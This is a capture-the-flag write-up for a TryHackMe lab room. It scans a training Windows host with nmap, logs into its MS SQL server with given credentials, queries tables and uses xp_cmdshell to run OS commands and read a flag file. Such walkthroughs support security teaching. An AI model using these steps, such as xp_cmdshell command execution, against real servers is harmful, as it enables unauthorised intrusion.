# Where Are The Reindeers?


- SQL is a relational database management system (RDBMS)
- Great [video](https://www.youtube.com/watch?v=HXV3zeQKqGY) for sql

## Exercise
- Use nmap to enumerate machine. Since we know that it's a windows machine and it won't respond to ping probes by default, we use the -Pn flag. Port 1433 has the service ms-sql-s running
>sudo nmap -sS --script=vuln -Pn 10.10.99.113
>Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-12 14:54 EST
>Pre-scan script results:
>| broadcast-avahi-dos: 
>|   Discovered hosts:
>|     224.0.0.251
>|   After NULL UDP avahi packet DoS (CVE-2011-1002).
>|_  Hosts are all up (not vulnerable).
>Nmap scan report for 10.10.99.113
>Host is up (0.20s latency).
>Not shown: 996 filtered tcp ports (no-response)
>PORT     STATE SERVICE
>22/tcp   open  ssh
>135/tcp  open  msrpc
>1433/tcp open  ms-sql-s
>|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)
>3389/tcp open  ms-wbt-server
>
>Nmap done: 1 IP address (1 host up) scanned in 80.90 seconds
- sqsh is a database shell, basic syntax is `sqsh -S server -U username -P password`. We get the prompt `1>`
>sqsh -S 10.10.99.113 -U sa -P t7uLKzddQzVjVFJp
>sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
>Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
>This is free software with ABSOLUTELY NO WARRANTY
>For more information type '\warranty'
>1> 
- Use `SELECT * FROM reindeer.dbo.names;`, and then `go`. We find Rudolph
>1> SELECT * FROM reindeer.dbo.names;
>2> go
> id          first                                    last                                     nickname                                
> ----------- ---------------------------------------- ---------------------------------------- ----------------------------------------
>           1 Dasher                                   Dasher                                   Dasher                                  
>           2 Dancer                                   Dancer                                   Dancer                                  
>           3 Prancer                                  Prancer                                  Prancer                                 
>           4 Vixen                                    Vixen                                    Vixen                                   
>           5 Comet                                    Comet                                    Comet                                   
>           6 Cupid                                    Cupid                                    Cupid                                   
>           7 Donner                                   Donder                                   Dunder                                  
>           8 Blitzen                                  Blixem                                   Blitzen                                 
>           9 Rudolph                                  Reindeer                                 Red Nosed                               
>
>(9 rows affected)
>1> 
- Use `SELECT * FROM reindeer.dbo.schedule;`, and then `go`. We find that the destination is Prague
>1> SELECT * FROM reindeer.dbo.schedule;
>2> go
> id                   date                destination                                                                      notes                                   
> -------------------- ------------------- -------------------------------------------------------------------------------- ----------------------------------------
>                 2000 Dec  5 2021 12:00AM Tokyo                                                                            NULL                                    
>                 2001 Dec  3 2021 12:00AM London                                                                           NULL                                    
>                 2002 Dec  1 2021 12:00AM New York                                                                         NULL                                    
>                 2003 Dec  2 2021 12:00AM Paris                                                                            NULL                                    
>                 2004 Dec  4 2021 12:00AM California                                                                       NULL                                    
>                 2005 Dec  7 2021 12:00AM Prague                                                                           NULL                                    
>                 2006 Dec 11 2021 12:00AM Bangkok                                                                          NULL                                    
>                 2007 Dec 10 2021 12:00AM Seoul                                                                            NULL                                    
>
>(8 rows affected)
>1> 
- Do the same for the presents table, we find 25000
- Some MS SQL servers have xp_cmdshell enabled, which lets us execute commands: `xp_cmdshell <command>`
    - Note that this is a Windows machine, so use the correct commands
- We know it's in the grinch home directory, so it must be under on of the folders in `C:\Users\grinch`. Check all the folders with `xp_cmdshell 'dir C:\Users\grinch\<folder>'`and `go` and we find that there's a file called flag.txt in the Documents folder
- Then do `xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt'`and `go` and we find `THM{YjtKeUy2qT3v5dDH}`
